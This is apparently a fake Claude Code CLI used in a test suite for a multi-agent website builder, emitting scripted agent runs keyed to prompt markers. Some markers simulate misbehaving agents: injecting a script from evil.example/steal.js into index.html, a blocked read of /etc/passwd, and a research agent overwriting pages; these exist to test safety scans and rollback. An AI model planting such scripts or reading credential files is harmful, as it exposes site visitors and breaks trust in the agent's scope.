#!/usr/bin/env python3
"""A stand-in for the Claude Code CLI, used by the test suite. It never calls a model.

It answers like the real CLI:
  --help                         prints help text that names the model aliases
  -p … --output-format json      a model check (used by POST /api/models/check)
  -p … --output-format stream-json   an agent run: streams init, a Write tool use, a text reply and a result

Markers inside the prompt choose what happens during an agent run:
  [[fail]]          the result is an error
  [[fail-once]]     fails the first time in this folder, succeeds afterwards (to test Continue)
  [[crash]]         exits with "not logged in" on stderr
  [[hang]]          sleeps 60 s (to test AGENT_TIMEOUT)
  [[slow]]          sleeps 2.5 s before finishing (to test stop / busy)
  [[escape]]        reports a blocked read of /etc/passwd (a permission denial)
  [[inject-script]] writes an external <script> into index.html (to test the safety scan)
  [[redo]]          the Critic sends work back (REDO lines) whenever <send_back> lists agents
  [[research-escape]]  the Research agent also edits index.html and creates evil.html (the server must undo both)
  (the Critic always ends with "Score: 8.5/10.")
  [[new-page]]      the HTML agent also creates about.html (titled "About us") and a page with a bad name, Bad Name.html

The Research agent writes research.md (with a WebSearch step) instead of touching index.html.

The Orchestrator (its system prompt starts "You are the Orchestrator") answers with a JSON decision, chosen by
markers inside <user_request>:
  [[orch:css,js]]   picks those agents (default: css)
  [[orch-talk]]     no agent: asks the user a question
  [[orch-form]]     no agent: asks a short form (once answered, picks css)
  [[orch-confirm]]  picks design + css, but waits for the user's yes
  [[orch-garbage]]  replies with text that isn't JSON (the server falls back to the whole team)

Every call is appended to $FAKE_CLAUDE_LOG as one JSON line: {"argv": [...], "cwd": "..."}.
"""

import json
import os
import re
import sys
import time
import uuid
from pathlib import Path

args = sys.argv[1:]


def arg(name):
    return args[args.index(name) + 1] if name in args and args.index(name) + 1 < len(args) else None


if os.environ.get("FAKE_CLAUDE_LOG"):
    with open(os.environ["FAKE_CLAUDE_LOG"], "a") as f:
        f.write(json.dumps({"argv": args, "cwd": os.getcwd()}) + "\n")

if "--help" in args:
    print("Usage: claude [options] [command] [prompt]\n\n"
          "  --model <model>   Model for the current session. Provide\n"
          "                    an alias for the latest model (e.g.\n"
          "                    'fable', 'opus', or 'sonnet') or a\n"
          "                    model's full name.\n")
    sys.exit(0)

prompt = arg("-p") or ""
model = arg("--model") or "default"
fmt = arg("--output-format")

if fmt == "json":                                    # model check
    if "bad" in model:
        print(f'[claude-code:unrecognized_model] {{"model":"{model}"}}', file=sys.stderr)
        print(json.dumps({"is_error": False, "result": "", "total_cost_usd": 0, "modelUsage": {}}))
    else:
        print(json.dumps({"is_error": False, "result": "OK", "total_cost_usd": 0.0001,
                          "modelUsage": {f"claude-{model}-resolved": {}}}))
    sys.exit(0)


def out(obj):
    print(json.dumps(obj), flush=True)


role = arg("--append-system-prompt") or ""
if role.startswith("You are the Orchestrator"):
    out({"type": "system", "subtype": "init", "model": f"claude-{model}-test"})
    req = re.search(r"<user_request>(.*?)</user_request>", prompt, re.S)
    req = req.group(1) if req else ""
    pick = re.search(r"\[\[orch:([a-z0-9,-]+)\]\]", req)
    if "[[orch-garbage]]" in req:
        answer = "I think the CSS agent should do it."
    elif "[[orch-form]]" in req and "My answers to your questions" not in req:
        answer = json.dumps({"intent": "unclear", "agents": [], "reason": "", "reply": "A few details first:",
                             "questions": [{"text": "Which page?", "kind": "single", "options": ["Home", "About"]},
                                           {"text": "Which colours?", "kind": "multi", "options": ["Blue", "Green", "Red"]},
                                           {"text": "The business name?", "kind": "text", "placeholder": "e.g. Al Amal"}]})
    elif "[[orch-confirm]]" in req:
        answer = json.dumps({"intent": "confirm", "agents": ["design", "css"], "notes": {"css": "note for css"},
                             "reason": "A full redesign.", "reply": "The team will redesign every page. Go ahead?"})
    elif "[[orch-talk]]" in req:
        answer = json.dumps({"intent": "unclear", "agents": [], "reason": "", "reply": "Which section should change?"})
    else:
        ids = pick.group(1).split(",") if pick else ["css"]
        answer = "```json\n" + json.dumps({"intent": "change", "agents": ids, "notes": {i: f"note for {i}" for i in ids},
                                           "reason": "Only styling is needed."}) + "\n```"
    out({"type": "result", "subtype": "success", "is_error": False, "result": answer, "total_cost_usd": 0.001, "num_turns": 1})
    sys.exit(0)
m = re.search(r"You are the (.+?) agent", role)
agent = m.group(1) if m else "Some"
out({"type": "system", "subtype": "init", "model": f"claude-{model}-test"})

if "[[crash]]" in prompt:
    print("Error: you are not logged in. Please run /login", file=sys.stderr)
    sys.exit(1)
if "[[hang]]" in prompt:
    time.sleep(60)
if "[[slow]]" in prompt:
    time.sleep(2.5)


def result(text, is_error=False, denials=()):
    out({"type": "result", "subtype": "error" if is_error else "success", "is_error": is_error, "result": text,
         "total_cost_usd": 0.0123, "num_turns": 3, "duration_api_ms": 1500,
         "usage": {"input_tokens": 100, "cache_read_input_tokens": 50, "output_tokens": 20},
         "permission_denials": list(denials)})


if "[[fail-once]]" in prompt and not Path(".failed-once").exists():
    Path(".failed-once").write_text("x")
    result("Simulated failure for the test.", is_error=True)
    sys.exit(0)
if "[[fail]]" in prompt:
    result("Simulated failure for the test.", is_error=True)
    sys.exit(0)

if agent == "Research":
    out({"type": "assistant", "message": {"content": [{"type": "tool_use", "id": "toolu_s", "name": "WebSearch",
                                                       "input": {"query": "coffee shop websites"}}]}})
    out({"type": "user", "message": {"content": [{"type": "tool_result", "tool_use_id": "toolu_s", "content": "results"}]}})
    Path("research.md").write_text("# Research: test\n\n## Sources\n1. [1] Example — https://example.com\n")
    out({"type": "assistant", "message": {"content": [{"type": "tool_use", "id": "toolu_r", "name": "Write",
                                                       "input": {"file_path": str(Path("research.md").resolve()), "content": "…"}}]}})
    out({"type": "user", "message": {"content": [{"type": "tool_result", "tool_use_id": "toolu_r", "content": "ok"}]}})
    if "[[research-escape]]" in prompt:
        Path("index.html").write_text("hacked")
        Path("evil.html").write_text("<script>bad()</script>")
    result("Research agent: improved idea, 1 source.")
    sys.exit(0)

# a normal step: append a line to index.html with a Write tool use
tid = "toolu_" + uuid.uuid4().hex[:12]
page = Path("index.html")
content = (page.read_text() if page.exists() else "<!doctype html><title>Test</title>\n") + f"<p>{agent} was here</p>\n"
if "[[inject-script]]" in prompt:
    content += '<script src="https://evil.example/steal.js"></script>\n'
out({"type": "assistant", "message": {"content": [{"type": "tool_use", "id": tid, "name": "Write",
                                                   "input": {"file_path": str(page.resolve()), "content": content}}]}})
page.write_text(content)
if "[[new-page]]" in prompt and agent == "HTML":
    Path("about.html").write_text("<!doctype html><title>About us</title><h1>About</h1>\n")
    Path("Bad Name.html").write_text("<!doctype html><title>Bad</title>\n")
out({"type": "user", "message": {"content": [{"type": "tool_result", "tool_use_id": tid, "content": "ok"}]}})
out({"type": "assistant", "message": {"content": [{"type": "text", "text": f"{agent} agent: did my step."}]}})
denials = [{"tool_name": "Read", "tool_use_id": "toolu_x", "tool_input": {"file_path": "/etc/passwd"}}] if "[[escape]]" in prompt else []
reply = f"{agent} agent: did my step."
if agent == "Critic":
    reply += "\nScore: 8.5/10."
if "[[redo]]" in prompt and agent == "Critic" and "Agents you can send work back to" in prompt:
    reply += ("\nREDO: css — icons in .features are misaligned; use the icon-text pattern"
              "\nREDO: html — the hero has an empty spacer div\nREDO: seo — not in this run, must be ignored")
result(reply, denials=denials)
